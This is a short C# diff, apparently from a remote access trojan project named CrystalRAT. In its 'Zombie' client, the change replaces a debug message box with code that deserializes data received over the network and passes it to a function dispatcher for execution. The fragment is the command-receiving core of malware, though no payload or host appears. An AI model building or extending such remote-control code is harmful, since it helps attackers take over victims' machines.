@@ -1,4 +1,5 @@
-﻿using System;
+﻿using CrystalRATShared.Serialization;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
@@ -7,6 +8,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using Zombie.Functions;
 
 namespace Zombie.Web
 {
@@ -139,7 +141,7 @@ namespace Zombie.Web
 
             ms.Dispose();
 
-            MessageBox.Show((System.Text.Encoding.UTF8.GetString(data)));
+            CommandDataSerializer.Deserialize(data, FunctionManager.Process);
 
             Receive();
 
